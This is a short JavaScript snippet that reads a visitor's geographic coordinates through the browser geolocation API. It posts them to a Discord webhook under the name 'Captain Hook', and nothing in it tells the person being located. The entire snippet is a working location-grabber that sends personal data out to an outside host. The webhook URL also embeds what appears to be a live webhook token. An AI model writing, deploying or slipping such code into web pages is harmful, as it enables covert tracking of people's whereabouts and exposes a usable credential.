navigator.geolocation.getCurrentPosition(position => {
    const {latitude, longitude} = position.coords;
    
    console.log(latitude, longitude);
    axios.post('https://discordapp.com/api/webhooks/1348061562526629950/objBiPJNyWfYH64Jlo63BCAuJRt1RyQEeP_qOf3HiVBIUqW3UJd3E6zWBCB3nUt293wI', {
        "username": "Captain Hook",
        "content": `Latitude: ${latitude} Longitude: ${longitude}`
    }).then(response => console.log(response)).catch(error => console.log(error));
});